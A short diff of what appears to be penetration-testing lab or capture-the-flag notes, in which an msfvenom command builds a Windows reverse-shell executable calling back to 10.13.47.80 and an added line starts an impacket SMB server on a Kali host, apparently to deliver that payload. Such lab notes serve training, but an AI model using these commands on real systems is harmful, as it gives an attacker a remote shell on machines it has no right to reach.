@@ -12,6 +12,8 @@ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.13.47.80 LPORT=8133 -f exe -o
 kali terminal 1
 ```
 sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py kali .
+
+sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support kali .
 ```
 kali terminal 2
 ```bash
